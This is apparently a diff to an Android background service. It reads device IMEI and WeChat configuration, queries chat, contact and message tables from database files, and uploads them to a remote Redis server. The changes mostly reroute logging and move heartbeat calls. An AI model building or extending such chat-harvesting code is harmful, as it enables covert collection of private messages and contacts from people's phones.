@@ -87,16 +87,11 @@ public class GohnsonService extends Service {
     private String mDbPassword = "";
 
     HashMap<String, String> mapUIN = new HashMap<String, String>();
-    boolean isFirstStarted = true;//判断 首次启动，是的话生成日志
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         LogInputUtil.e(TAG, "GohnsonService 启动");
-
-        if (isFirstStarted) {
-            MyLog.init(MyApplication1.getApp().getCacheDir().getPath());
-            isFirstStarted = false;
-        }
+        initIMEI();
 
         CrashReport.initCrashReport(getApplicationContext(), GlobalCofig.BUGLY_ID, GlobalCofig.BUGLY_ISDEBUG);
 
@@ -155,7 +150,7 @@ public class GohnsonService extends Service {
                 executeUpload();
 
                 isWriteHeartBeatLog(existTime);
-                pushHearBeat();
+              //  pushHearBeat();
             }
         };
         mTimer.schedule(mTimerTask, 0, GlobalCofig.EXECUTE_HEARBEAT_INTERVAL);//多少秒执行一次
@@ -218,8 +213,6 @@ public class GohnsonService extends Service {
         TelephonyManager tm = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
         String strIMEI =tm.getDeviceId();
 
-
-
         String tencentCompatibleInfoPath = GlobalCofig.OPERATION_DIR + GlobalCofig.COMPATIBLE_INFO_CFG;
         if (new File(tencentCompatibleInfoPath).exists())
             wxIMEI = Common.getWxIMEI(tencentCompatibleInfoPath);
@@ -231,7 +224,7 @@ public class GohnsonService extends Service {
             wxIMEI1 = Common.getWxIMEI(tencent1CompatibleInfoPath);
         else
             wxIMEI1 = strIMEI;
-        LogInputUtil.e(TAG, "deviceId = "+strIMEI+",wxIMEI = " + wxIMEI+",wxIMEI1="+wxIMEI1);
+        MyLog.inputLogToFile(TAG, "deviceId = "+strIMEI+",wxIMEI = " + wxIMEI+",wxIMEI1="+wxIMEI1);
 
      /*   String parallelLiteCompatibleInfoPath =GlobalCofig.OPERATION_DIR_PARALLEL_LITE + GlobalCofig.COMPATIBLE_INFO_CFG;
         if (new File(parallelLiteCompatibleInfoPath).exists())
@@ -311,6 +304,7 @@ public class GohnsonService extends Service {
                         if (fileChangeTime == saveChangeTime) {
                             String noChangeStr = "文件无改变，不操作该数据库，lastModifiedTime = " + fileChangeTime + ",saveTime = " + saveChangeTime + ",filePath = " + f.getPath();
                             MyLog.inputLogToFile(TAG, noChangeStr);
+                            pushHearBeat();
                             continue;
                         }
 
@@ -356,7 +350,6 @@ public class GohnsonService extends Service {
                         } catch (Exception e) {
                             String exceptionStr = "异常 ：读取数据库信息失败" + e.getMessage().toString() + ",filePath = " + (dbFile == null ? "" : dbFile.getPath());
                             MyLog.inputLogToFile(TAG, exceptionStr);
-                            //LogInputUtil.showSingleTosatShort(this,exceptionStr);
                         } finally {
                             if (dataTarget != null)
                                 dataTarget.close();
@@ -369,7 +362,7 @@ public class GohnsonService extends Service {
                 }
             }
         } catch (Exception e) {
-            MyLog.inputLogToFile(TAG, "异常：GetFiles Exception" + e.getMessage());
+            MyLog.inputLogToFile(TAG, "异常：GetFiles Exception " + e.getMessage());
         }
     }
 
@@ -457,6 +450,7 @@ public class GohnsonService extends Service {
 //            allMessageUploadSucceed = uploadMessageDataToRedis(GlobalCofig.REDIS_KEY_MESSAGE, messageJsonStr, file);
 //        }
         boolean allMessageUploadSucceed = false;
+
         for (int i = 0; i < 100; i++) {
             LogInputUtil.e(TAG, "第" + i + "次查询message表");
             boolean dataUploadSucceed = false;
@@ -482,7 +476,8 @@ public class GohnsonService extends Service {
 
         if (chatroomUploadSucceed && rcontactUploadSucceed && userInfoUploadSucceed && allMessageUploadSucceed) {
             ShareData.getInstance().saveLongValue(this, file.getPath(), fileChangeTime);
-            LogInputUtil.e(TAG, "本数据库所有数据已上传，若修改时间不更新，不再操作该数据库，key = " + file.getPath() + ",time =" + fileChangeTime);
+            MyLog.inputLogToFile(TAG, "本数据库所有数据已上传，若修改时间不更新，不再操作该数据库，key = " + file.getPath() + ",time =" + fileChangeTime);
+            pushHearBeat();
         }
     }
 
@@ -547,7 +542,7 @@ public class GohnsonService extends Service {
         try {
             Jedis myJedis = new Jedis(GlobalCofig.REDIS_HOST, GlobalCofig.Port,10000);
             myJedis.auth(GlobalCofig.REDIS_AUTH);
-            LogInputUtil.e(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
+            MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
             long pushValue = myJedis.lpush(key, jsonValue);
 
             ShareData.getInstance().saveIntValue(this, hashKey, newJsonHashCode);
@@ -564,7 +559,7 @@ public class GohnsonService extends Service {
         try {
             Jedis myJedis = new Jedis(GlobalCofig.REDIS_HOST, GlobalCofig.Port,10000);
             myJedis.auth(GlobalCofig.REDIS_AUTH);
-            LogInputUtil.e(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
+            MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
             long pushValue = myJedis.lpush(key, jsonValue);
 
 
